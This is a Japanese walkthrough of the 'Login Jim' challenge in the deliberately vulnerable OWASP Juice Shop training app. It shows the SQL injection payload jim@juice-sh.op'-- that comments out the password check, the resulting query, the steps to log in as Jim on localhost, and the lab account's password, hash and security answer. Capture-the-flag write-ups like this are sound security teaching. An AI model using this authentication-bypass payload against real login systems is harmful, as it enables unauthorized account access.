# Login Jim ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** SQLi
**目標:** 特定のユーザー（Jim）としてログインする

---

## 思考プロセス

**ステップ1: 問題の理解**
```
「' OR 1=1-- だと最初のユーザー（admin）でログインする」
    ↓
「特定のユーザー（Jim）でログインしたい」
    ↓
「メールアドレスを指定しつつ、パスワードチェックをスキップできないか？」
```

**ステップ2: SQLの構造を考える**
```sql
-- 元のSQL
SELECT * FROM Users WHERE email = '入力値' AND password = '...'

-- 目標: email を jim@juice-sh.op に固定しつつ、AND以降を無効化
SELECT * FROM Users WHERE email = 'jim@juice-sh.op'--' AND password = '...'
                                                    ^^ ここでコメント開始
```

**ステップ3: ペイロードの組み立て**
```
「jim@juice-sh.op の後に ' を付けてSQL文字列を閉じる」
    ↓
「-- を付けて残りをコメント化」
    ↓
「jim@juice-sh.op'-- が完成」
```

## 実行手順

1. `http://localhost:3000/#/login` にアクセス
2. Email欄に入力:
   ```
   jim@juice-sh.op'--
   ```
3. Password欄に何か入力（例: `a`）
4. Login をクリック → Jim としてログイン成功

## コード/ペイロード

```sql
-- 攻撃後のSQL
SELECT * FROM Users WHERE email = 'jim@juice-sh.op'--' AND password = '...'
                                  ^^^^^^^^^^^^^^^^^ 正しいメールアドレス
                                                   ^ 文字列を閉じる
                                                    ^^ コメント開始
                                                      ^^^^^^^^^^^^^^^^^ 無視される
```

## Jim の認証情報

```
メール: jim@juice-sh.op
パスワード: ncc-1701
パスワードハッシュ: e541ca7ecf72b8d1286474fc613e5e45
セキュリティ質問: Your eldest siblings middle name?
セキュリティ回答: Samuel
```

- Jim = James T. Kirk（スタートレック）
- `ncc-1701` = エンタープライズ号の登録番号

## 関連チャレンジ

- [Login Admin](../difficulty-2/login-admin.md)
- [Login Bender](login-bender.md)
- [Reset Jim's Password](reset-jims-password.md)
